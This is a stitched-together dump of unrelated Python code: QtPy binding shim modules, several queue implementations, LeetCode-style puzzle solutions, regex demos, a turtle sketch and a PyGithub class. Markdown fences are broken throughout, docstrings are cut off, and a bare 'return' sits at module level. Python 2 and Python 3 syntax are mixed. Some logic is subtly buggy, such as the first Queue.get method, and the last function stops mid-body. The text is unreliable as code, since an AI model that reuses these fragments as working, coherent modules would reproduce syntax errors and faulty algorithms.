            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DLogic classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DLogic import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DLogic as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DLogic):
            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DRender classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DRender import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DRender as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DRender):
            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2019- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtChart classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    try:
        from PyQt5 import QtChart as QtCharts
    except ImportError:
        raise PythonQtError(
            "The QtChart module was not found. "
            "It needs to be installed separately for PyQt5."
        )
elif PYSIDE2:
    from PySide2.QtCharts import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtDataVisualization classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtDataVisualization import *
elif PYSIDE2:
    # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
    import PySide2.QtDataVisualization as __temp
    import inspect

    for __name in inspect.getmembers(__temp.QtDataVisualization):
        globals()[__name[0]] = __name[1]
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
#
# Copyright © 2014-2015 Colin Duquesnoy
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````py
Provides QtDesigner classes and functions.```


```py

from . import PYQT5, PYQT4, PythonQtError


if PYQT5:
    from PyQt5.QtDesigner import *
elif PYQT4:
    from PyQt4.QtDesigner import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
#
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````pyQtHelp Wrapper."""

import warnings

from . import PYQT5
from . import PYQT4
from . import PYSIDE
from . import PYSIDE2

if PYQT5:
    from PyQt5.QtHelp import *
elif PYSIDE2:
    from PySide2.QtHelp import *
elif PYQT4:
    from PyQt4.QtHelp import *
elif PYSIDE:
    from PySide.QtHelp import *

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtLocation classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtLocation import *
elif PYSIDE2:
    from PySide2.QtLocation import *
else:
    raise PythonQtError("No Qt bindings could be found")

import warnings

from . import PYQT5
from . import PYQT4
from . import PYSIDE
from . import PYSIDE2

if PYQT5:
    from PyQt5.QtMultimedia import *
elif PYSIDE2:
    from PySide2.QtMultimedia import *
elif PYQT4:
    from PyQt4.QtMultimedia import *
    from PyQt4.QtGui import QSound
elif PYSIDE:
    from PySide.QtMultimedia import *
    from PySide.QtGui import QSound

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtMultimediaWidgets classes and functions."""

# Local imports
from . import PYSIDE2, PYQT5, PythonQtError

if PYQT5:
    from PyQt5.QtMultimediaWidgets import *
elif PYSIDE2:
    from PySide2.QtMultimediaWidgets import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
#
# Copyright © 2014-2015 Colin Duquesnoy
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````py
Provides QtNetwork classes and functions.```


```py

from . import PYQT5, PYSIDE2, PYQT4, PYSIDE, PythonQtError


if PYQT5:
    from PyQt5.QtNetwork import *
elif PYSIDE2:
    from PySide2.QtNetwork import *
elif PYQT4:
    from PyQt4.QtNetwork import *
elif PYSIDE:
    from PySide.QtNetwork import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtOpenGL classes and functions."""

# Local imports
from . import PYQT4, PYQT5, PYSIDE, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtOpenGL import *
elif PYSIDE2:
    from PySide2.QtOpenGL import *
elif PYQT4:
    from PyQt4.QtOpenGL import *
elif PYSIDE:
    from PySide.QtOpenGL import *
else:
    raise PythonQtError("No Qt bindings could be found")

del PYQT4, PYQT5, PYSIDE, PYSIDE2

# -*- coding: utf-8 -*-
#
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````py
Provides QtPrintSupport classes and functions.```


```py

from . import PYQT5, PYQT4, PYSIDE2, PYSIDE, PythonQtError


if PYQT5:
    from PyQt5.QtPrintSupport import *
elif PYSIDE2:
    from PySide2.QtPrintSupport import *
elif PYQT4:
    from PyQt4.QtGui import (
        QAbstractPrintDialog,
        QPageSetupDialog,
        QPrintDialog,
        QPrintEngine,
        QPrintPreviewDialog,
        QPrintPreviewWidget,
        QPrinter,
        QPrinterInfo,
    )
elif PYSIDE:
    from PySide.QtGui import (
        QAbstractPrintDialog,
        QPageSetupDialog,
        QPrintDialog,
        QPrintEngine,
        QPrintPreviewDialog,
        QPrintPreviewWidget,
        QPrinter,
        QPrinterInfo,
    )
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtQml classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtQml import *
elif PYSIDE2:
    from PySide2.QtQml import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtQuick classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtQuick import *
elif PYSIDE2:
    from PySide2.QtQuick import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtQuickWidgets classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError

if PYQT5:
    from PyQt5.QtQuickWidgets import *
elif PYSIDE2:
    from PySide2.QtQuickWidgets import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtSql classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PYQT4, PYSIDE, PythonQtError

if PYQT5:
    from PyQt5.QtSql import *
elif PYSIDE2:
    from PySide2.QtSql import *
elif PYQT4:
    from PyQt4.QtSql import *
elif PYSIDE:
    from PySide.QtSql import *
else:
    raise PythonQtError("No Qt bindings could be found")

del PYQT4, PYQT5, PYSIDE, PYSIDE2

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtSvg classes and functions."""

# Local imports
from . import PYQT4, PYSIDE2, PYQT5, PYSIDE, PythonQtError

if PYQT5:
    from PyQt5.QtSvg import *
elif PYSIDE2:
    from PySide2.QtSvg import *
elif PYQT4:
    from PyQt4.QtSvg import *
elif PYSIDE:
    from PySide.QtSvg import *
else:
    raise PythonQtError("No Qt bindings could be found")

del PYQT4, PYQT5, PYSIDE, PYSIDE2

# -*- coding: utf-8 -*-
#
# Copyright © 2014-2015 Colin Duquesnoy
# Copyright © 2009- The Spyder Developmet Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````py
Provides QtTest and functions```


```py

from . import PYQT5, PYSIDE2, PYQT4, PYSIDE, PythonQtError


if PYQT5:
    from PyQt5.QtTest import QTest
elif PYSIDE2:
    from PySide2.QtTest import QTest
elif PYQT4:
    from PyQt4.QtTest import QTest as OldQTest

    class QTest(OldQTest):
        @staticmethod
        def qWaitForWindowActive(QWidget):
            OldQTest.qWaitForWindowShown(QWidget)


elif PYSIDE:
    from PySide.QtTest import QTest
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtWebChannel classes and functions."""

# Local imports
from . import PYSIDE2, PYQT5, PythonQtError

if PYQT5:
    from PyQt5.QtWebChannel import *
elif PYSIDE2:
    from PySide2.QtWebChannel import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
#
# Copyright © 2014-2015 Colin Duquesnoy
# Copyright © 2009- The Spyder development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
````

````py
Provides QtWebEngineWidgets classes and functions.```


```py

from . import PYQT5, PYSIDE2, PYQT4, PYSIDE, PythonQtError


# To test if we are using WebEngine or WebKit
WEBENGINE = True


if PYQT5:
    try:
        from PyQt5.QtWebEngineWidgets import QWebEnginePage
        from PyQt5.QtWebEngineWidgets import QWebEngineView
        from PyQt5.QtWebEngineWidgets import QWebEngineSettings
    except ImportError:
        from PyQt5.QtWebKitWidgets import QWebPage as QWebEnginePage
        from PyQt5.QtWebKitWidgets import QWebView as QWebEngineView
        from PyQt5.QtWebKit import QWebSettings as QWebEngineSettings

        WEBENGINE = False
elif PYSIDE2:
    from PySide2.QtWebEngineWidgets import QWebEnginePage
    from PySide2.QtWebEngineWidgets import QWebEngineView
    from PySide2.QtWebEngineWidgets import QWebEngineSettings
elif PYQT4:
    from PyQt4.QtWebKit import QWebPage as QWebEnginePage
    from PyQt4.QtWebKit import QWebView as QWebEngineView
    from PyQt4.QtWebKit import QWebSettings as QWebEngineSettings

    WEBENGINE = False
elif PYSIDE:
    from PySide.QtWebKit import QWebPage as QWebEnginePage
    from PySide.QtWebKit import QWebView as QWebEngineView
    from PySide.QtWebKit import QWebSettings as QWebEngineSettings

    WEBENGINE = False
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtWebSockets classes and functions."""

# Local imports
from . import PYSIDE2, PYQT5, PythonQtError

if PYQT5:
    from PyQt5.QtWebSockets import *
elif PYSIDE2:
    from PySide2.QtWebSockets import *
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides QtXmlPatterns classes and functions."""

# Local imports
from . import PYQT4, PYSIDE2, PYQT5, PYSIDE, PythonQtError

if PYQT5:
    from PyQt5.QtXmlPatterns import *
elif PYSIDE2:
    from PySide2.QtXmlPatterns import *
elif PYQT4:
    from PyQt4.QtXmlPatterns import *
elif PYSIDE:
    from PySide.QtXmlPatterns import *
else:
    raise PythonQtError("No Qt bindings could be found")
````

```pyQueue represented by a python list"""


class Queue:
    def __init__(self):
        self.entries = []
        self.length = 0
        self.front = 0

    def __str__(self):
        printed = "<" + str(self.entries)[1:-1] + ">"
        return printed

    """Enqueues {@code item}
    @param item
        item to enqueue"""

    def put(self, item):
        self.entries.append(item)
        self.length = self.length + 1

    """Dequeues {@code item}
    @requirement: |self.length| > 0
    @return dequeued
        item that was dequeued"""

    def get(self):
        self.length = self.length - 1
        dequeued = self.entries[self.front]
        self.front -= 1
        self.entries = self.entries[self.front :]
        return dequeued

    """Rotates the queue {@code rotation} times
    @param rotation
        number of times to rotate queue"""

    def rotate(self, rotation):
        for i in range(rotation):
            self.put(self.get())

    """Enqueues {@code item}
    @return item at front of self.entries"""

    def front(self):
        return self.entries[0]

    """Returns the length of this.entries"""

    def size(self):
        return self.length
```

```pyQueue represented by a pseudo stack (represented by a list with pop and append)"""


class Queue:
    def __init__(self):
        self.stack = []
        self.length = 0

    def __str__(self):
        printed = "<" + str(self.stack)[1:-1] + ">"
        return printed

    """Enqueues {@code item}
    @param item
        item to enqueue"""

    def put(self, item):
        self.stack.append(item)
        self.length = self.length + 1

    """Dequeues {@code item}
    @requirement: |self.length| > 0
    @return dequeued
        item that was dequeued"""

    def get(self):
        self.rotate(1)
        dequeued = self.stack[self.length - 1]
        self.stack = self.stack[:-1]
        self.rotate(self.length - 1)
        self.length = self.length - 1
        return dequeued

    """Rotates the queue {@code rotation} times
    @param rotation
        number of times to rotate queue"""

    def rotate(self, rotation):
        for i in range(rotation):
            temp = self.stack[0]
            self.stack = self.stack[1:]
            self.put(temp)
            self.length = self.length - 1

    """Reports item at the front of self
    @return item at front of self.stack"""

    def front(self):
        front = self.get()
        self.put(front)
        self.rotate(self.length - 1)
        return front

    """Returns the length of this.stack"""

    def size(self):
        return self.length

class Solution:
    def reconstructQueue(self, people: List[List[int]]) -> List[List[int]]:
        people.sort(key=lambda x: (-x[0], x[1]))
        rec = []
        for p in people:
            rec.insert(p[1], p)
        return rec

# Suppose you have a random list of people standing in a queue. Each person is described by a pair
# of integers (h, k), where h is the height of the person and k is the number of people in front of
# this person who have a height greater than or equal to h. Write an algorithm to reconstruct the queue.
#
# Note:
# The number of people is less than 1,100.
#
# Input:
# [[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]]
#
# Output:
# [[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]]


class Solution:
    def reconstructQueue(self, people):
        people.sort(key=lambda x: (-x[0], x[1]))
        res = []
        for p in people:
            res.insert(p[1], p)
        return res


if __name__ == "__main__":
    people = [[7, 0], [4, 4], [7, 1], [5, 0], [6, 1], [5, 2]]
    print(Solution().reconstructQueue(people))

# Implement the following operations of a queue using stacks.
#
# push(x) -- Push element x to the back of queue.
# pop() -- Removes the element from in front of queue.
# peek() -- Get the front element.
# empty() -- Return whether the queue is empty.
# Example:
#
# MyQueue queue = new MyQueue();
#
# queue.push(1);
# queue.push(2);
# queue.peek();  // returns 1
# queue.pop();   // returns 1
# queue.empty(); // returns false


class MyQueue:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.s1 = []
        self.s2 = []

    def push(self, x):
        """
        Push element x to the back of queue.
        """
        self.s1.append(x)

    def pop(self):
        """
        Removes the element from in front of queue and returns that element.
        """
        if self.s2:
            return self.s2.pop()

        while self.s1:
            self.s2.append(self.s1.pop())

        return self.s2.pop()

    def peek(self):
        """
        Get the front element.
        """
        if self.s2:
            return self.s2[len(self.s2) - 1]

        while self.s1:
            self.s2.append(self.s1.pop())

        return self.s2[len(self.s2) - 1]

    def empty(self):
        """
        Returns whether the queue is empty.
        """
        if self.s2 == [] and self.s1 == []:
            return True
        return False
```

```pyMake a Queue class using a list!
Hint: You can use any Python list method
you'd like! Try to write each one in as
few lines as possible.
Make sure you pass the test cases too!"""

class Queue:
    def __init__(self, head=None):
        self.storage = [head]

    def enqueue(self, new_element):
        if(self.storage):
            self.storage.append(new_element)
        else:
            self.storage = [new_element]
        return new_element

    def peek(self):
        if(self.storage):
            return self.storage[0]
        else:
            return None

    def dequeue(self):
        if(self.storage):
            return self.storage.pop(0)
        else:
            return None

# Setup
q = Queue(1)
q.enqueue(2)
q.enqueue(3)

# Test peek
# Should be 1
print q.peek()

# Test dequeue
# Should be 1
print q.dequeue()

# Test enqueue
q.enqueue(4)
# Should be 2
print q.dequeue()
# Should be 3
print q.dequeue()
# Should be 4
print q.dequeue()
q.enqueue(5)
# Should be 5
print q.peek()

from random import choices


class Solution:
    def __init__(self, w: List[int]):
        self.w = w

    def pickIndex(self) -> int:
        return choices(range(len(self.w)), self.w)[0]


# Your Solution object will be instantiated and called as such:
# obj = Solution(w)
# param_1 = obj.pickIndex()

import random
import turtle

t = turtle.Pen()

for i in range(150):
    t.color(random.choice(["green", "red", "violet"]))
    t.width(5)
    t.forward(i)
    t.right(30)

# Given an arbitrary ransom note string and another string containing letters from all the
# magazines, write a function that will return true if the ransom note can be constructed
# from the magazines ; otherwise, it will return false.
#
# Each letter in the magazine string can only be used once in your ransom note.
#
# Note:
# You may assume that both strings contain only lowercase letters.
#
# canConstruct("a", "b") -> false
# canConstruct("aa", "ab") -> false
# canConstruct("aa", "aab") -> true

import collections


def ransom(ransomnote, magazine):
    dict_mag = collections.defaultdict(int)

    for c in magazine:
        dict_mag[c] += 1

    for c in ransomnote:
        dict_mag[c] -= 1
        if dict_mag[c] < 0:
            return False

    return True


if __name__ == "__main__":
    print(ransom("aa", "aab"))

from itertools import permutations as p


def stringsRearrangement(inputArray):
    p_list = list(p(inputArray))
    for i in range(len(p_list)):
        count1 = 0
        for j in range(len(p_list[0]) - 1):
            count2 = 0
            for k in range(len(p_list[0][0])):
                if p_list[i][j][k] != p_list[i][j + 1][k]:
                    count2 += 1
            if count2 == 1:
                count1 += 1
        if count1 >= (len(p_list[0])) - 1:
            return True
    return False

def palindromeRearranging(inputString):
    odd_count = 0
    char_set = set(inputString)
    for i in char_set:
        char_count = inputString.count(i)
        if char_count % 2 != 0:
            odd_count += 1
    if odd_count <= 1:
        return True
    return False

# def fractionReducing(f):
#     return [i / math.gcd(f[0], f[1]) for i in f]

# fractionReducing = lambda f: [i / math.gcd(f[0], f[1]) for i in f]

f, = eval(dir()[0])
return [i / math.gcd(f[0], f[1]) for i in f]

class Solution:
    # @param A : string
    # @return an integer
    def braces(self, A):
        stack = []
        ops = set(["*", "+", "-", "/"])
        for i in A:
            if i == "(":
                stack.append("(")
                continue
            elif i == ")":
                if stack.pop() == "(":
                    return 1
                stack.pop()
                continue
            elif i in ops:
                stack.append(i)
        return 0

import re

# Return a list containing every occurrence of "ai":

txt = "The rain in Spain"
x = re.findall("ai", txt)
print(x)

import re

txt = "The rain in Spain"

# Check if "Portugal" is in the string:

x = re.findall("Portugal", txt)
print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

class Solution:
    def removeDuplicates(self, nums: List[int]) -> int:
        p = 0
        while p < len(nums) - 1:
            if nums[p] == nums[p + 1]:
                nums.pop(p + 1)
                continue
            p += 1
        return len(nums)

def remove_instance(nums, val):
    """
    Given an array nums, and a value val, returns the new length of the array with the value removed
    i.e. the number of items in nums with val
    Input: nums=[5, 2, 2, 5, 3]  and   val = 5
    Output: 3
    """
    try:
        # check for cases of an empty array
        if len(nums) == 0:
            return 0
        else:
            count = 0
            for i in nums:
                if i != val:
                    count += 1
            return count
    except:
        return 0

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def removeElements(self, head: ListNode, val: int) -> ListNode:
        pointer = ListNode(0)
        pointer.next = head

        tempnode = pointer
        while tempnode.next != None:
            if tempnode.next.val == val:
                tempnode.next = tempnode.next.next
            else:
                tempnode = tempnode.next
        return pointer.next

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:
        tail = head
        length = 1
        while tail.next:
            length += 1
            tail = tail.next
        if length == 1:
            return None
        if length == n:
            return head.next
        tempnode = head
        for _ in range(0, length - n - 1):
            tempnode = tempnode.next
        tempnode.next = tempnode.next.next
        return head


# One Pass

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:
        dummy = fast = slow = ListNode()
        dummy.next = head
        if not head.next:
            return None
        for _ in range(n + 1):
            fast = fast.next
        while fast:
            fast = fast.next
            slow = slow.next
        slow.next = slow.next.next
        return dummy.next

# Given a sorted linked list, delete all duplicates such that each
# element appear only once.
#
# Input: 1->1->2
# Output: 1->2
#
# Input: 1->1->2->3->3
# Output: 1->2->3


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def removeDuplicates(self, head):
        if not head:
            return None
        if head.next is None:
            return head
        prev, curr = head, head.next

        while curr:
            if prev.val == curr.val:
                prev.next = curr.next
                curr = prev.next
            else:
                prev = prev.next
                curr = curr.next
        return head


if __name__ == "__main__":
    arr = [1, 1, 2, 2, 3, 3, 4]
    node = ListNode(arr[0])
    n = node
    for i in arr[1:]:
        n.next = ListNode(i)
        n = n.next
    newnode = Solution().removeDuplicates(node)
    while newnode:
        print(newnode.val)
        newnode = newnode.next

# Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list.
#
# Example 1:
#
# Input: 1->2->3->3->4->4->5
# Output: 1->2->5
# Example 2:
#
# Input: 1->1->1->2->3
# Output: 2->3


class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def deleteDuplicates(self, head: ListNode) -> ListNode:

        if not head:
            return head
        if not head.next:
            return head

        node = ListNode(-1)
        node.next = head
        prev = node
        curr = node.next

        while curr and curr.next:
            if curr.val == curr.next.val:
                preval = curr.val
                while curr and curr.val == preval:
                    curr = curr.next
                prev.next = curr
            else:
                prev = prev.next
                curr = curr.next

        return node.next

# Input: nums = [0,1,2,2,3,0,4,2], val = 2
# Output: 5, nums = [0,1,4,0,3]


def removeElement(arr, element):
    dictonary = {}
    output = 0
    for iter in arr:
        if iter in dictonary:
            dictonary[iter] += 1
        else:
            dictonary[iter] = 1
    # {0: 2, 1: 1, 3: 1, 4: 1}
    delete = int(dictonary.get(element))
    for i in range(delete):
        arr.remove(element)
    del dictonary[element]
    output = sum(dictonary.values())
    return arr, output


arr = [0, 1, 2, 2, 3, 0, 4, 2]
element = 2
nums, output = removeElement(arr, 2)
print(nums, "::", output)

# Given the head of a linked list, we repeatedly delete consecutive sequences
# of nodes that sum to 0 until there are no such sequences.
#
# After doing so, return the head of the final linked list.  You may return any such answer.
#
# Example 1:
#
# Input: head = [1,2,-3,3,1]
# Output: [3,1]
# Note: The answer [1,2,1] would also be accepted.
# Example 2:
#
# Input: head = [1,2,3,-3,4]
# Output: [1,2,4]
# Example 3:
#
# Input: head = [1,2,3,-3,-2]
# Output: [1]

# Definition for singly-linked list.


class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


import collections


class Solution:
    def removeZeroSumSublists(self, head):
        seen = collections.OrderedDict()
        sentinal = ListNode(0)
        sentinal.next = head
        curr = sentinal
        prefix = 0

        while curr:
            prefix += curr.val
            if prefix not in seen:
                seen[prefix] = curr
            else:
                node = seen[prefix]
                node.next = curr.next
                while list(seen.keys())[-1] != prefix:
                    seen.popitem()

            curr = curr.next

        return sentinal.next

class Solution:
    def reorganizeString(self, S: str) -> str:
        l = len(S)
        A = []
        for k, v in sorted((S.count(x), x) for x in set(S)):
            if k > (l + 1) / 2:
                return ""
            A.extend(k * v)
        # print(A)
        ans = [None] * l
        ans[::2], ans[1::2] = A[(l // 2) :], A[: (l // 2)]
        return "".join(ans)

class Solution:
    def findRepeatedDnaSequences(self, s: str) -> List[str]:
        dic = {}
        ans = []
        for i in range(0, len(s) - 9):
            if s[i : i + 10] not in dic:
                dic[s[i : i + 10]] = 1
            else:
                dic[s[i : i + 10]] += 1
        for k, v in dic.items():
            if v > 1:
                ans.append(k)
        return ans

#!/bin/python3

# Complete the repeatedString function below.
def repeatedString(string, characters):
    count = 0
    length = len(string)
    remainder = characters % length
    quotient = characters // length

    temp_string = string * quotient
    temp_add = string[0:remainder]
    final_string = temp_string + temp_add
    list_string = list(final_string)
    for iter in list_string:
        if "a" in iter:
            count += 1
    return count


string = "aba"
characters = 10

print(repeatedString(string, characters))

class Solution:
    def repeatedStringMatch(self, A: str, B: str) -> int:
        la = len(A)
        lb = len(B)

        steps = 2 + lb // la

        for i in range(steps + 1):
            if B in A * i:
                return i
        return -1

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    new = []
    for i in range(len(inputArray)):
        if inputArray[i] == elemToReplace:
            new.append(substitutionElem)
        else:
            new.append(inputArray[i])
    return new

############################ Copyrights and license ############################
#                                                                              #
# Copyright 2020 Dhruv Manilawala <dhruvmanila@gmail.com>                      #
#                                                                              #
# This file is part of PyGithub.                                               #
# http://pygithub.readthedocs.io/                                              #
#                                                                              #
# PyGithub is free software: you can redistribute it and/or modify it under    #
# the terms of the GNU Lesser General Public License as published by the Free  #
# Software Foundation, either version 3 of the License, or (at your option)    #
# any later version.                                                           #
#                                                                              #
# PyGithub is distributed in the hope that it will be useful, but WITHOUT ANY  #
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS    #
# FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more #
# details.                                                                     #
#                                                                              #
# You should have received a copy of the GNU Lesser General Public License     #
# along with PyGithub. If not, see <http://www.gnu.org/licenses/>.             #
#                                                                              #
################################################################################

import github.GithubObject
import github.Repository


class RepositoryPreferences(github.GithubObject.NonCompletableGithubObject):
    """
    This class represents repository preferences.
    The reference can be found here https://docs.github.com/en/free-pro-team@latest/rest/reference/checks#update-repository-preferences-for-check-suites
    """

    @property
    def preferences(self):
        """
        :type: dict
        """
        return self._preferences.value

    @property
    def repository(self):
        """
        :type: :class:`github.Repository.Repository`
        """
        return self._repository.value

    def _initAttributes(self):
        self._preferences = github.GithubObject.NotSet
        self._repository = github.GithubObject.NotSet

    def _useAttributes(self, attributes):
        if "preferences" in attributes:  # pragma no branch
            self._preferences = self._makeDictAttribute(attributes["preferences"])
        if "repository" in attributes:  # pragma no branch
            self._repository = self._makeClassAttribute(
                github.Repository.Repository, attributes["repository"]
            )

# Write a function that reverses a string. The input string is given as an array of characters char[].
# Do not allocate extra space for another array, you must do this by modifying the input array in-place
# with O(1) extra memory.  You may assume all the characters consist of printable ascii characters.
#
# Example 1:
# Input: ["h","e","l","l","o"]
# Output: ["o","l","l","e","h"]
# Example 2:
# Input: ["H","a","n","n","a","h"]
# Output: ["h","a","n","n","a","H"]


class Solution:
    def reversefun(self, arr):
        left, right = 0, len(arr) - 1

        while left < right:
            arr[left], arr[right] = arr[right], arr[left]
            left, right = left + 1, right - 1

        return arr


if __name__ == "__main__":
    strs = ["H", "e", "l", "l", "o"]
    print(Solution().reversefun(strs))

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def reverse(head):
    if not head:
        return None
    temp = prev = head
    sec = head.next
    head.next = None
    while sec.next:
        temp = sec.next
        sec.next = prev
        prev = sec
        sec = temp
    sec.next = prev
    return sec

# For your reference:
#
# DoublyLinkedListNode:
#     int data
#     DoublyLinkedListNode next
#     DoublyLinkedListNode prev
#
#
def reverse(head):
    temp = newHead = head
    while temp:
        prev = temp.prev
        temp.prev = temp.next
        temp.next = prev
        newHead = temp
        temp = temp.prev
    return newHead

class Solution:
    def reverseBits(self, n: int) -> int:
        s = str(bin(n))
        s = s[2:]
        s = "0" * (32 - len(s)) + s
        s = int(s[::-1], 2)
        return s

class Solution:
    def reverse(self, x: int) -> int:
        x = str(x)
        if x[0] == "-":
            a = x[1:2147483648:1]
            a = a[::-1]
            if int(a) > 2147483648:
                return 0
            return int("-" + a)
        else:
            a = x[::-1]
            if int(a) > 2147483647:
                return 0
            return int(a)

# Singly-linked lists are already defined with this interface:
# class ListNode(object):
#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def reverseLinkedList(l):
    prev = None
    current = l
    while current:
